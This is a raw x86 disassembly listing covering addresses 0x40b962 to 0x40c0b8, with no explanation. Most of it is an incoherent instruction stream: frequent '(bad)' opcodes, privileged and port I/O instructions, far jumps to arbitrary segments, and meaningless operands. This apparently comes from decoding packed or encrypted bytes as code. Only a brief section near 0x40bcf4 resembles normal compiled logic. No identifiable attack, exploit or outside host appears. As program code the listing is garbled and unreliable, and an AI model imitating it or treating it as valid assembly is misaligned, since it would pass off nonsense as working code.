  40b962:	cld    
  40b963:	aam    0xad
  40b965:	shl    ecx,0x77
  40b968:	sub    al,0x7a
  40b96a:	arpl   sp,di
  40b96c:	jp     0x40b977
  40b96e:	ss pop eax
  40b970:	push   ss
  40b971:	dec    eax
  40b972:	pop    edx
  40b973:	(bad)  
  40b974:	xor    ecx,DWORD PTR [edx+edx*1+0x60d32fbd]
  40b97b:	jnp    0x40b91c
  40b97d:	cld    
  40b97e:	adc    BYTE PTR [esi-0x61],ch
  40b981:	or     DWORD PTR [edi+ecx*8+0x5eda7455],ecx
  40b988:	push   es
  40b989:	cli    
  40b98a:	mov    dh,0xd3
  40b98c:	xor    dl,cl
  40b98e:	outs   dx,BYTE PTR ds:[esi]
  40b98f:	jg     0x40ba0b
  40b991:	int    0xc0
  40b993:	xchg   ecx,eax
  40b994:	shr    BYTE PTR [esi+0x539e6978],cl
  40b99a:	into   
  40b99b:	push   ebp
  40b99c:	sub    edx,DWORD PTR [edx]
  40b99e:	loop   0x40b9d9
  40b9a0:	mov    esp,0xad655014
  40b9a5:	ror    BYTE PTR [edx+0x47],0xb7
  40b9a9:	int    0x0
  40b9ab:	pop    edi
  40b9ac:	xchg   BYTE PTR [eax+0x3f04ca8],dl
  40b9b2:	jle    0x40ba10
  40b9b4:	mov    dl,0xe2
  40b9b6:	ret    0x6c11
  40b9b9:	ficom  WORD PTR [edx+ebp*8-0x5cf4bbe7]
  40b9c0:	cmp    al,BYTE PTR [eax-0x6b440fa3]
  40b9c6:	shl    BYTE PTR [edi+0x19],cl
  40b9c9:	data16 mov al,ds:0x390bc59f
  40b9cf:	dec    edx
  40b9d0:	pop    ebp
  40b9d1:	arpl   WORD PTR [ebx+edi*8+0x1d],si
  40b9d5:	sub    BYTE PTR [eax],0xdc
  40b9d8:	icebp  
  40b9d9:	jno    0x40ba28
  40b9db:	cld    
  40b9dc:	and    edx,DWORD PTR [eax]
  40b9de:	add    al,0x34
  40b9e0:	mov    ds:0x9b005132,eax
  40b9e5:	and    al,0xa8
  40b9e7:	adc    edi,ebx
  40b9e9:	ds dec dl
  40b9ec:	jmp    0x40b9b4
  40b9ee:	shr    DWORD PTR [ebp+0x28],0xcd
  40b9f2:	pop    ebp
  40b9f3:	push   cs
  40b9f4:	cmc    
  40b9f5:	mov    esi,0xa1739704
  40b9fa:	je     0x40ba51
  40b9fc:	dec    esi
  40b9fd:	ret    
  40b9fe:	fwait
  40b9ff:	inc    ebx
  40ba00:	jnp    0x40b9e5
  40ba02:	pop    es
  40ba03:	mov    ebx,0x563668ee
  40ba08:	mov    dh,BYTE PTR [ebx-0x74a3eac3]
  40ba0e:	stos   DWORD PTR es:[edi],eax
  40ba0f:	imul   esp,DWORD PTR [ebx+0x3a76f1a0],0xe3d77454
  40ba19:	add    DWORD PTR [eax-0x48d0532d],ebx
  40ba1f:	jecxz  0x40b9b8
  40ba21:	(bad)  [edi-0x17]
  40ba24:	call   0x3bc58bfa
  40ba29:	(bad)  
  40ba2a:	cmc    
  40ba2b:	das    
  40ba2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba2d:	sbb    ecx,eax
  40ba2f:	test   dl,al
  40ba31:	mov    ch,0xdd
  40ba33:	es stc 
  40ba35:	xchg   edi,eax
  40ba36:	test   DWORD PTR [esi+eax*2],ecx
  40ba39:	icebp  
  40ba3a:	call   0x6f6d:0xcecdbb8b
  40ba41:	ret    
  40ba42:	xor    esi,DWORD PTR [edx+0x50]
  40ba45:	xor    al,cl
  40ba47:	mov    al,ds:0x414881bc
  40ba4c:	aaa    
  40ba4d:	mov    edx,DWORD PTR [esi]
  40ba4f:	pop    ds
  40ba50:	and    eax,0x70ca8e27
  40ba55:	ins    BYTE PTR es:[edi],dx
  40ba56:	cmpps  xmm7,xmm2,0xf5
  40ba5a:	and    al,0x9b
  40ba5c:	push   esi
  40ba5d:	ret    
  40ba5e:	adc    ecx,ecx
  40ba60:	std    
  40ba61:	(bad)  
  40ba62:	sub    DWORD PTR [ecx+esi*4+0x59b58559],esp
  40ba69:	and    BYTE PTR [ecx+0x2cf95d81],bl
  40ba6f:	dec    edx
  40ba70:	mov    edi,0xaeb3bb2c
  40ba75:	mov    WORD PTR [ebp-0x56],ss
  40ba78:	jb     0x40bae6
  40ba7a:	mul    BYTE PTR [esi-0x3919a0b1]
  40ba80:	imul   edx,eax,0x99b0d925
  40ba86:	cmc    
  40ba87:	leave  
  40ba88:	(bad)  [ebp-0x24]
  40ba8b:	or     al,0x26
  40ba8d:	add    DWORD PTR [edx+0x69],edx
  40ba90:	push   es
  40ba91:	js     0x40ba43
  40ba93:	lods   eax,DWORD PTR ds:[esi]
  40ba94:	mov    dl,0x29
  40ba96:	fmul   QWORD PTR [ebx+0x72]
  40ba99:	pusha  
  40ba9a:	jmp    0xb081:0x37caa4e5
  40baa1:	push   edi
  40baa2:	pop    ebp
  40baa3:	and    DWORD PTR [edi-0x68bae3b9],esi
  40baa9:	retf   
  40baaa:	mov    BYTE PTR [ebx],ch
  40baac:	mov    esp,0x4d49096b
  40bab1:	mov    edi,0x6bf058dc
  40bab6:	test   eax,0xff19e16e
  40babb:	inc    ecx
  40babc:	ins    BYTE PTR es:[edi],dx
  40babd:	mov    ds:0xc1ee20d2,al
  40bac2:	and    eax,0x15ebf2de
  40bac7:	mov    cl,0xc2
  40bac9:	lahf   
  40baca:	mov    ch,0xd3
  40bacc:	stos   DWORD PTR es:[edi],eax
  40bacd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bace:	jb     0x40bb01
  40bad0:	mov    ebp,0x44bb845
  40bad5:	sbb    DWORD PTR [ebx-0x2732c561],edx
  40badb:	push   ds
  40badc:	xchg   ecx,eax
  40badd:	dec    esp
  40bade:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40badf:	or     esp,edi
  40bae1:	sub    cl,BYTE PTR [edx+0x118aa779]
  40bae7:	jno    0x40bad1
  40bae9:	pusha  
  40baea:	dec    ecx
  40baeb:	pop    edi
  40baec:	adc    ebx,ebx
  40baee:	pop    ebp
  40baef:	xor    esp,esi
  40baf1:	imul   eax,DWORD PTR [ebx],0x47
  40baf4:	cld    
  40baf5:	mov    edi,0x722e1f5f
  40bafa:	push   0x71
  40bafc:	mov    ch,BYTE PTR [ecx+0x16]
  40baff:	adc    al,0x56
  40bb01:	dec    esi
  40bb02:	sub    esp,DWORD PTR [ecx+0x7700d29a]
  40bb08:	lahf   
  40bb09:	cmp    DWORD PTR [esi+0x6c],edx
  40bb0c:	xchg   ebx,eax
  40bb0d:	fwait
  40bb0e:	or     al,BYTE PTR [ebp-0x78]
  40bb11:	cmp    DWORD PTR [esi+0x251c14f4],edx
  40bb17:	dec    ebp
  40bb18:	ja     0x40bb04
  40bb1a:	mov    edi,0xafa70182
  40bb1f:	mov    edi,0x2d6f26df
  40bb24:	adc    eax,0x815faf89
  40bb29:	xor    BYTE PTR [esi+0x3ae15d95],0xc5
  40bb30:	rcl    BYTE PTR [eax],0x8a
  40bb33:	xor    ebx,DWORD PTR [edx+0x7c082c58]
  40bb39:	jno    0x40bb19
  40bb3b:	mov    al,0x2c
  40bb3d:	fs pop ecx
  40bb3f:	retf   
  40bb40:	dec    eax
  40bb41:	inc    esi
  40bb42:	dec    eax
  40bb43:	inc    edi
  40bb44:	aas    
  40bb45:	test   BYTE PTR [edi-0xd],ch
  40bb48:	push   esi
  40bb49:	push   ebx
  40bb4a:	push   0xe78040d
  40bb4f:	nop
  40bb50:	push   ecx
  40bb51:	outs   dx,DWORD PTR ds:[esi]
  40bb52:	inc    DWORD PTR [esi+0x2474419f]
  40bb58:	sbb    eax,0xdfee1a2c
  40bb5d:	outs   dx,BYTE PTR ds:[esi]
  40bb5e:	loope  0x40bbbe
  40bb60:	pop    ecx
  40bb61:	xlat   BYTE PTR ds:[ebx]
  40bb62:	inc    esi
  40bb63:	jmp    DWORD PTR [esp+eiz*8]
  40bb66:	mov    al,0x12
  40bb68:	mov    esp,ecx
  40bb6a:	test   esp,eax
  40bb6c:	cmp    BYTE PTR ds:0x4eb41bc6,al
  40bb72:	mov    WORD PTR [edx-0xb7397f5],fs
  40bb78:	call   0x861fd4c
  40bb7d:	mov    edx,0xd2857ee7
  40bb82:	fidiv  WORD PTR [eax+0x5c77f3ff]
  40bb88:	cdq    
  40bb89:	pop    edi
  40bb8a:	or     bl,BYTE PTR [ebx]
  40bb8c:	(bad)  
  40bb8d:	mov    edi,0xf9c9c1f6
  40bb92:	cmc    
  40bb93:	xlat   BYTE PTR ds:[ebx]
  40bb94:	rcl    DWORD PTR [esi+0x6b],0x9f
  40bb98:	sub    ebp,DWORD PTR [ebp-0x53]
  40bb9b:	outs   dx,BYTE PTR ds:[esi]
  40bb9c:	aaa    
  40bb9d:	sar    DWORD PTR [edi+0x68cfa7bf],0xb8
  40bba4:	jle    0x40bb57
  40bba6:	and    DWORD PTR [edx+edi*2],ebx
  40bba9:	mov    esp,gs
  40bbab:	mov    BYTE PTR [ebp+0x0],bl
  40bbae:	sbb    DWORD PTR [esi+0x1b],ebx
  40bbb1:	or     esi,DWORD PTR [eax]
  40bbb3:	pop    ss
  40bbb4:	cmp    BYTE PTR [eax+0x46ba28ca],dh
  40bbba:	(bad)  [eax+0x7b31d875]
  40bbc0:	add    esp,eax
  40bbc2:	push   eax
  40bbc3:	mov    edi,DWORD PTR [ebx-0x3258f69]
  40bbc9:	sbb    eax,0xf810165
  40bbce:	xchg   edx,eax
  40bbcf:	mov    dh,BYTE PTR [edx-0x40a952c6]
  40bbd5:	rol    BYTE PTR [ebp-0x22],1
  40bbd8:	jbe    0x40bb7e
  40bbda:	retf   
  40bbdb:	xor    dl,BYTE PTR [edi]
  40bbdd:	mov    ebx,0x1b0ab55e
  40bbe2:	lea    ecx,[edx+0x67f7a58]
  40bbe8:	pop    ds
  40bbe9:	in     al,0x70
  40bbeb:	fnstenv ds:0xa3f1b742
  40bbf1:	mov    WORD PTR [eax+0x0],cs
  40bbf4:	push   0xffffffa9
  40bbf6:	scas   al,BYTE PTR es:[edi]
  40bbf7:	cs sbb esp,ebx
  40bbfa:	jnp    0x40bc57
  40bbfc:	xrelease xchg BYTE PTR [eax-0x7e640f25],dl
  40bc03:	repnz adc ebx,DWORD PTR [ebx+eiz*2-0x1f]
  40bc08:	test   eax,0xe599048d
  40bc0d:	mov    eax,ds:0xb3e950a0
  40bc12:	mov    esp,0x7460121e
  40bc18:	jno    0x40bc18
  40bc1a:	add    ch,BYTE PTR [esi-0xd]
  40bc1d:	sbb    eax,0x5278c8c9
  40bc22:	loopne 0x40bc1e
  40bc24:	(bad)  
  40bc25:	push   cs
  40bc26:	mov    bh,BYTE PTR [eax+edx*8+0x6]
  40bc2a:	test   esi,0x1180c47f
  40bc30:	xchg   ebx,eax
  40bc31:	test   al,0x74
  40bc33:	mul    BYTE PTR [esi-0xb]
  40bc36:	or     BYTE PTR [esi],bh
  40bc38:	inc    esp
  40bc39:	imul   edx,DWORD PTR [eax],0xea3972e0
  40bc3f:	fdiv   DWORD PTR [eax]
  40bc41:	gs cmp ah,ch
  40bc44:	jecxz  0x40bcb1
  40bc46:	cmp    DWORD PTR [esi-0x3a],esp
  40bc49:	lods   eax,DWORD PTR ds:[esi]
  40bc4a:	cld    
  40bc4b:	and    BYTE PTR [edi+ebp*8],dl
  40bc4e:	pop    ebp
  40bc4f:	fnstsw WORD PTR [esi-0x26]
  40bc52:	arpl   WORD PTR [eax+eax*4],bx
  40bc55:	pop    ds
  40bc56:	pop    edi
  40bc57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc58:	cmc    
  40bc59:	retf   
  40bc5a:	les    ebp,FWORD PTR [edi+esi*1+0x49]
  40bc5e:	lahf   
  40bc5f:	cmc    
  40bc60:	jmp    0x40bc4c
  40bc62:	cs jmp 0x40bc20
  40bc65:	lods   al,BYTE PTR ds:[esi]
  40bc66:	ds sbb edx,eax
  40bc69:	inc    esi
  40bc6a:	add    dl,BYTE PTR [ebx+0x39]
  40bc6d:	fs sti 
  40bc6f:	xor    DWORD PTR [esi+eax*1+0x56],esi
  40bc73:	neg    DWORD PTR [ebx]
  40bc75:	rcl    ebp,cl
  40bc77:	push   ecx
  40bc78:	rcr    DWORD PTR [eax-0x60f15735],0xc4
  40bc7f:	dec    edi
  40bc80:	jns    0x40bce8
  40bc82:	jo     0x40bcf6
  40bc84:	in     eax,dx
  40bc85:	xchg   edi,eax
  40bc86:	xlat   BYTE PTR ds:[ebx]
  40bc87:	push   0xea005985
  40bc8c:	cmp    al,0x3a
  40bc8e:	cmp    bh,ah
  40bc90:	(bad)  
  40bc92:	adc    eax,0x436583b8
  40bc97:	dec    edi
  40bc98:	popa   
  40bc99:	data16 clc 
  40bc9b:	daa    
  40bc9c:	ja     0x40bc7c
  40bc9e:	jb     0x40bd0e
  40bca0:	mov    edx,0x8277543d
  40bca5:	or     dl,al
  40bca7:	shl    DWORD PTR es:[ebp+0x38],0x43
  40bcac:	push   ebp
  40bcad:	inc    ebp
  40bcae:	jae    0x40bc85
  40bcb0:	data16 jecxz 0x40bc88
  40bcb3:	call   DWORD PTR [ecx]
  40bcb5:	shl    DWORD PTR ds:0x6188655f,cl
  40bcbb:	mov    gs,WORD PTR [esi+eax*4]
  40bcbe:	jno    0x40bc62
  40bcc0:	push   0x2d
  40bcc2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bcc3:	lods   eax,DWORD PTR ds:[esi]
  40bcc4:	mov    BYTE PTR [ebp+0x62],dh
  40bcc7:	fisubr WORD PTR [eax]
  40bcc9:	scas   eax,DWORD PTR es:[edi]
  40bcca:	mov    fs,WORD PTR [edx]
  40bccc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bccd:	sub    BYTE PTR [eax],ah
  40bccf:	sbb    ch,BYTE PTR [edx+ebp*2]
  40bcd2:	xor    bl,bh
  40bcd4:	out    dx,al
  40bcd5:	and    eax,0xac0f30ef
  40bcda:	dec    esi
  40bcdb:	and    al,0x84
  40bcdd:	dec    edi
  40bcde:	test   al,0xa2
  40bce0:	ins    DWORD PTR es:[edi],dx
  40bce1:	shr    DWORD PTR [ebp+0x74f4c4f5],1
  40bce7:	ja     0x40bc87
  40bce9:	inc    edx
  40bcea:	mov    dl,0xbd
  40bcec:	scas   al,BYTE PTR es:[edi]
  40bced:	int    0x57
  40bcef:	icebp  
  40bcf0:	outs   dx,DWORD PTR ds:[esi]
  40bcf1:	fidiv  WORD PTR [eax+0x13]
  40bcf4:	mov    ebx,DWORD PTR [ebp-0x10]
  40bcf7:	sub    ebx,edi
  40bcf9:	cmp    ebx,edx
  40bcfb:	ja     0x40bd09
  40bd01:	mov    edx,DWORD PTR [ebp-0x34]
  40bd04:	jmp    0x40c0ee
  40bd09:	mov    edx,DWORD PTR [ebp-0x3c]
  40bd0c:	mov    edi,DWORD PTR [ebp-0x4]
  40bd0f:	xor    edx,eax
  40bd11:	xor    edi,eax
  40bd13:	add    edx,ecx
  40bd15:	add    edi,ecx
  40bd17:	imul   edx,edi
  40bd1a:	mov    edi,DWORD PTR [ebp-0x8]
  40bd1d:	mov    ebx,DWORD PTR [ebp-0x10]
  40bd20:	sub    ebx,edi
  40bd22:	cmp    ebx,edx
  40bd24:	mov    edx,DWORD PTR [ebp-0x38]
  40bd27:	jbe    0x40c0ee
  40bd2d:	jmp    0x40c0eb
  40bd32:	xchg   edx,eax
  40bd33:	dec    edx
  40bd34:	inc    edx
  40bd35:	inc    esp
  40bd36:	inc    edx
  40bd37:	push   esp
  40bd38:	xchg   edx,eax
  40bd39:	dec    edx
  40bd3a:	fdiv   DWORD PTR [edx+edi*8]
  40bd3d:	adc    cl,BYTE PTR [esi+0x36]
  40bd40:	(bad)  [bx+0x708f]
  40bd45:	jo     0x40bce6
  40bd47:	jge    0x40bdb9
  40bd49:	jo     0x40bd3e
  40bd4b:	xor    dl,bl
  40bd4d:	scas   al,BYTE PTR es:[edi]
  40bd4e:	add    eax,0x912d74ed
  40bd53:	clc    
  40bd54:	repz or BYTE PTR [ecx-0x19],al
  40bd58:	mov    cl,0xbb
  40bd5a:	cld    
  40bd5b:	ror    BYTE PTR [ecx-0x7add365c],1
  40bd61:	pop    esp
  40bd62:	nop
  40bd63:	sbb    al,0xe9
  40bd65:	sbb    cl,BYTE PTR [ebp+0x198d1bc3]
  40bd6b:	mov    ch,0xe4
  40bd6d:	xor    ebx,DWORD PTR [esp+ebp*4]
  40bd70:	fwait
  40bd71:	clc    
  40bd72:	nop
  40bd73:	scas   eax,DWORD PTR es:[edi]
  40bd74:	lahf   
  40bd75:	xchg   esp,eax
  40bd76:	sbb    BYTE PTR ds:0xc06be851,dl
  40bd7c:	in     al,dx
  40bd7d:	gs not cl
  40bd80:	and    BYTE PTR [esi+ebx*8-0x742e2142],0xbb
  40bd88:	inc    eax
  40bd89:	cmp    DWORD PTR [edi],0x1f
  40bd8c:	pop    ds
  40bd8d:	jmp    0x768e:0x9cce1f02
  40bd94:	add    eax,0x779a745
  40bd99:	retf   0xc817
  40bd9c:	mul    DWORD PTR [esi]
  40bd9e:	int3   
  40bd9f:	dec    eax
  40bda0:	cdq    
  40bda1:	or     DWORD PTR [eax-0x5a864f64],esi
  40bda7:	jnp    0x40bd85
  40bda9:	jae    0x40bd52
  40bdab:	mov    bl,0xcc
  40bdad:	in     al,dx
  40bdae:	mov    ?,WORD PTR [eax-0x61f32acb]
  40bdb4:	xchg   edx,eax
  40bdb5:	pop    es
  40bdb6:	iret   
  40bdb7:	jno    0x40bdf7
  40bdb9:	das    
  40bdba:	xchg   edx,eax
  40bdbb:	loopne 0x40bd69
  40bdbd:	pushf  
  40bdbe:	xor    eax,0xf887f198
  40bdc3:	mov    edi,0x7b9539c8
  40bdc8:	outs   dx,DWORD PTR ds:[esi]
  40bdc9:	inc    ebp
  40bdca:	clc    
  40bdcb:	cmp    edx,ebx
  40bdcd:	add    eax,0x61d09ec
  40bdd2:	loop   0x40bd81
  40bdd4:	mov    ebp,0xb2de93a2
  40bdd9:	(bad)  
  40bdda:	jmp    0xe68b:0xde6d2c97
  40bde1:	hlt    
  40bde2:	lock lds ecx,FWORD PTR [esi-0x2a102f03]
  40bde9:	xchg   edx,eax
  40bdea:	mov    BYTE PTR [edx-0x7f21ec85],bh
  40bdf0:	(bad)  
  40bdf3:	pop    edi
  40bdf4:	shl    BYTE PTR cs:[ecx+eiz*1-0x7502692],0x78
  40bdfd:	stc    
  40bdfe:	jge    0x40bdcc
  40be00:	(bad)  
  40be01:	sar    ah,cl
  40be03:	dec    edi
  40be04:	xchg   ebp,eax
  40be05:	mov    ebx,0x74c5d9d1
  40be0a:	sbb    al,0xbd
  40be0c:	div    cl
  40be0e:	ins    BYTE PTR es:[edi],dx
  40be0f:	push   cs
  40be10:	aas    
  40be11:	icebp  
  40be12:	inc    esp
  40be13:	xchg   BYTE PTR [edx],bh
  40be15:	cwde   
  40be16:	and    ah,BYTE PTR [ecx-0x66]
  40be19:	lahf   
  40be1a:	test   BYTE PTR [edx-0x39],dh
  40be1d:	inc    BYTE PTR [esi]
  40be1f:	(bad)  
  40be20:	xchg   ebx,eax
  40be21:	aad    0x54
  40be23:	adc    eax,0x6fe0b144
  40be28:	mov    edi,0x420e0958
  40be2d:	fadd   st(2),st
  40be2f:	jge    0x40be05
  40be31:	xchg   ebp,eax
  40be32:	call   0x5c45:0xc2ac5f55
  40be39:	bound  eax,QWORD PTR [eax-0x5e]
  40be3c:	sub    ebx,DWORD PTR [edi-0x21]
  40be3f:	mov    bh,0xe5
  40be41:	dec    ebp
  40be42:	loope  0x40bded
  40be44:	sub    esi,DWORD PTR [edx]
  40be46:	xor    DWORD PTR [esi+0x42],ebx
  40be49:	jmp    0x40be16
  40be4b:	xor    BYTE PTR [esi-0x15],ah
  40be4e:	adc    al,0xe
  40be50:	mov    al,ds:0xf26cb43e
  40be55:	push   ds
  40be56:	test   BYTE PTR [ebx+0x1e0da6af],ch
  40be5c:	fistp  QWORD PTR [edx]
  40be5e:	add    eax,0xecb2cd6e
  40be63:	pop    esp
  40be64:	out    dx,al
  40be65:	xor    bh,ch
  40be67:	(bad)  
  40be68:	call   FWORD PTR [edx]
  40be6a:	jle    0x40be87
  40be6c:	dec    ecx
  40be6d:	mov    ?,WORD PTR [eax+edx*4+0x1d]
  40be71:	fbld   TBYTE PTR [eax]
  40be73:	(bad)  
  40be74:	xor    dl,BYTE PTR [ecx-0x3b]
  40be77:	ficom  WORD PTR [ecx-0x6542accf]
  40be7d:	sub    dh,0x2f
  40be80:	jae    0x40be48
  40be82:	call   0x2277edd6
  40be87:	pop    ds
  40be88:	arpl   WORD PTR [edx+0x1572959e],ax
  40be8e:	mov    bh,0x28
  40be90:	fist   WORD PTR ds:0x2de4891b
  40be96:	in     al,0x25
  40be98:	stc    
  40be99:	mov    DWORD PTR [edi-0x74],ecx
  40be9c:	jmp    0x89fc:0x1844c22a
  40bea3:	pop    eax
  40bea4:	or     eax,0xdf0475c8
  40bea9:	mov    cs,WORD PTR [edi-0x770b5575]
  40beaf:	aam    0x97
  40beb1:	push   ebx
  40beb2:	cli    
  40beb3:	fadd   DWORD PTR [edi-0x1b]
  40beb6:	dec    ebp
  40beb7:	xor    esi,edx
  40beb9:	and    dl,BYTE PTR [ebp+ebp*8-0x71]
  40bebd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bebe:	cmp    BYTE PTR [ecx-0x10aba775],al
  40bec4:	xchg   edx,eax
  40bec5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bec6:	stos   BYTE PTR es:[edi],al
  40bec7:	call   0x68190c33
  40becc:	xlat   BYTE PTR ds:[ebx]
  40becd:	jb     0x40becd
  40becf:	(bad)  
  40bed0:	mov    edx,0x10474367
  40bed5:	gs adc al,0x6d
  40bed8:	pop    ss
  40bed9:	inc    eax
  40beda:	scas   al,BYTE PTR es:[edi]
  40bedb:	leave  
  40bedc:	inc    eax
  40bedd:	inc    esp
  40bede:	bound  ecx,QWORD PTR [edi]
  40bee0:	cwde   
  40bee1:	dec    esi
  40bee2:	aam    0xee
  40bee4:	jl     0x40bf52
  40bee6:	mov    eax,ds:0xf6f5f31f
  40beeb:	dec    edi
  40beec:	aaa    
  40beed:	xor    eax,0xe3c86995
  40bef2:	dec    edi
  40bef3:	add    al,bl
  40bef5:	ret    0xfd05
  40bef8:	cmp    DWORD PTR [ecx],edi
  40befa:	jp     0x40bef7
  40befc:	mov    WORD PTR [edi],?
  40befe:	(bad)  
  40beff:	jno    0x40bef4
  40bf01:	popf   
  40bf02:	loope  0x40bf76
  40bf04:	fisubr WORD PTR [ebp+0x5e]
  40bf07:	outs   dx,DWORD PTR ds:[esi]
  40bf08:	into   
  40bf09:	loope  0x40bf44
  40bf0b:	jae    0x40bf3d
  40bf0d:	adc    al,0x7b
  40bf0f:	lods   eax,DWORD PTR ds:[esi]
  40bf10:	loopne 0x40bf09
  40bf12:	add    ecx,DWORD PTR [ebp+ecx*4-0x498bdfdc]
  40bf19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf1a:	pusha  
  40bf1b:	dec    esi
  40bf1c:	sub    al,0xb2
  40bf1e:	pop    esp
  40bf1f:	sbb    eax,0x8d87ca28
  40bf24:	mov    esp,0xb57853c2
  40bf29:	jne    0x40bf42
  40bf2b:	or     eax,edi
  40bf2d:	xor    DWORD PTR [edx+0x54cfe572],esp
  40bf33:	xor    eax,0xd4bdd332
  40bf38:	rcr    DWORD PTR [esi-0x30420ad3],cl
  40bf3e:	out    dx,al
  40bf3f:	jnp    0x40bf88
  40bf41:	das    
  40bf42:	mov    al,0x6b
  40bf44:	dec    edx
  40bf45:	or     ah,BYTE PTR [ecx+0x70]
  40bf48:	cmp    eax,0x503f8d48
  40bf4d:	nop
  40bf4e:	ss xchg ecx,eax
  40bf50:	or     BYTE PTR [ebp+0xa],dl
  40bf53:	xchg   esp,eax
  40bf54:	mov    ecx,0xa27defb7
  40bf59:	cmp    al,0xae
  40bf5b:	jp     0x40bef2
  40bf5d:	cmp    DWORD PTR [edx+0x4eb6314c],esi
  40bf63:	xor    dh,BYTE PTR [edi]
  40bf65:	xor    BYTE PTR ds:0x11c1ec8,ch
  40bf6b:	les    eax,FWORD PTR [edi+0x1a]
  40bf6e:	xor    al,0xdc
  40bf70:	push   edx
  40bf71:	fisub  WORD PTR [edi+edi*1-0x61da20bc]
  40bf78:	dec    edi
  40bf79:	mov    eax,DWORD PTR [ebx]
  40bf7b:	xchg   BYTE PTR [esi-0x43f7c78],cl
  40bf81:	test   DWORD PTR [edx-0x61],edi
  40bf84:	les    edx,FWORD PTR [eax-0x20]
  40bf87:	inc    eax
  40bf88:	pusha  
  40bf89:	pop    ebp
  40bf8a:	int3   
  40bf8b:	cld    
  40bf8c:	pushf  
  40bf8d:	and    al,0x8d
  40bf8f:	jmp    0x40bf87
  40bf91:	icebp  
  40bf92:	push   ecx
  40bf93:	jecxz  0x40bf8e
  40bf95:	fsubr  st(7),st
  40bf97:	loope  0x40bfe9
  40bf99:	jae    0x40bfef
  40bf9b:	cmp    BYTE PTR [edx+0x32],dl
  40bf9e:	in     al,dx
  40bf9f:	mov    bl,0xc7
  40bfa1:	lock mov esi,0x11ebd617
  40bfa7:	xchg   esi,eax
  40bfa8:	inc    edx
  40bfa9:	xor    dh,BYTE PTR [esi+0x5e3aa489]
  40bfaf:	push   esi
  40bfb0:	inc    esp
  40bfb1:	mov    ah,0xf4
  40bfb3:	push   eax
  40bfb4:	(bad)  
  40bfb5:	mul    DWORD PTR [ebp-0x25]
  40bfb8:	mov    ebx,0x736ddc8f
  40bfbd:	adc    cl,BYTE PTR [ecx-0x36]
  40bfc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bfc1:	inc    ebx
  40bfc2:	mov    ch,0xef
  40bfc4:	xchg   esi,eax
  40bfc5:	sub    DWORD PTR [edx+ebp*8],esp
  40bfc8:	push   ss
  40bfc9:	in     eax,0xe1
  40bfcb:	or     dh,BYTE PTR [ebp-0x358bce71]
  40bfd1:	dec    esi
  40bfd2:	jno    0x40bfc9
  40bfd4:	fcomp  DWORD PTR [esi]
  40bfd6:	ss inc edx
  40bfd8:	push   edx
  40bfd9:	cmp    DWORD PTR [ebx+0xa],eax
  40bfdc:	dec    esp
  40bfdd:	mov    ah,0xb9
  40bfdf:	inc    esi
  40bfe0:	sub    esp,DWORD PTR [edx-0x6192db0a]
  40bfe6:	lahf   
  40bfe7:	out    0x54,al
  40bfe9:	(bad)  
  40bfea:	jle    0x40bfb3
  40bfec:	test   eax,0x46181a78
  40bff1:	jae    0x40bfe5
  40bff3:	sahf   
  40bff4:	fwait
  40bff5:	mov    ah,0x6c
  40bff7:	sbb    eax,0xa27e5220
  40bffc:	mov    edi,0xc4f567a
  40c001:	pop    esp
  40c002:	sub    ebx,esp
  40c004:	hlt    
  40c005:	in     al,dx
  40c006:	repz inc edx
  40c008:	bound  ebp,QWORD PTR [edi-0x16]
  40c00b:	and    ah,BYTE PTR [edi-0x5f]
  40c00e:	ror    ah,1
  40c010:	add    edx,DWORD PTR [ebp+0x7d]
  40c013:	js     0x40c04a
  40c015:	ret    0x646b
  40c018:	mov    dl,0xb7
  40c01a:	rol    DWORD PTR [eax-0x6b298da9],0x3d
  40c021:	test   DWORD PTR ds:0x9cc56462,0xb1bc12
  40c02b:	or     ah,BYTE PTR [esi-0x13f37b1d]
  40c031:	mov    al,0xcd
  40c033:	out    dx,eax
  40c034:	fisttp WORD PTR [esi-0x31]
  40c037:	and    DWORD PTR ds:0xca563d74,edx
  40c03d:	fdiv   DWORD PTR [ebp-0x16]
  40c040:	ret    
  40c041:	outs   dx,DWORD PTR ds:[esi]
  40c042:	inc    esp
  40c043:	xor    DWORD PTR [eax-0xa005624],ebx
  40c049:	add    edx,DWORD PTR [ebx-0x3be499c]
  40c04f:	mov    dl,0xf5
  40c051:	ins    DWORD PTR es:[edi],dx
  40c052:	data16 mov al,0xe2
  40c055:	cs shr edx,0x35
  40c059:	lods   al,BYTE PTR ds:[esi]
  40c05a:	jg     0x40c08a
  40c05c:	pop    ss
  40c05d:	inc    ebp
  40c05e:	add    ebx,esi
  40c060:	add    BYTE PTR [esi],cl
  40c062:	pop    es
  40c063:	add    dh,bl
  40c065:	retf   0xca31
  40c068:	test   dl,ch
  40c06a:	out    0xd,eax
  40c06c:	fist   DWORD PTR fs:[eax]
  40c06f:	pop    ss
  40c070:	mov    BYTE PTR [ebx-0x49a771b2],dh
  40c076:	xlat   BYTE PTR ds:[ebx]
  40c077:	xor    dl,BYTE PTR [esi]
  40c079:	mov    eax,ds:0xf9a6c403
  40c07e:	pop    esi
  40c07f:	push   DWORD PTR [eax+0x1b]
  40c082:	(bad)  
  40c083:	movq   mm7,QWORD PTR [ebx+edx*4+0x5a]
  40c088:	out    0x62,al
  40c08a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c08b:	xor    bl,dl
  40c08d:	retf   0x5db2
  40c090:	scas   al,BYTE PTR es:[edi]
  40c091:	dec    ecx
  40c092:	call   0xe7da:0xb233a3b9
  40c099:	inc    eax
  40c09a:	das    
  40c09b:	call   0x77d0dd45
  40c0a0:	js     0x40c0de
  40c0a2:	mov    ch,0x2f
  40c0a4:	cmp    dl,BYTE PTR [edi+ebp*2-0x6645a98e]
  40c0ab:	xchg   bh,al
  40c0ad:	lods   eax,DWORD PTR ds:[esi]
  40c0ae:	push   esp
  40c0af:	ret    
  40c0b0:	or     al,0x9f
  40c0b2:	add    DWORD PTR [ecx+0x12c4efd4],ebx
  40c0b8:	call   0x34a42c0e
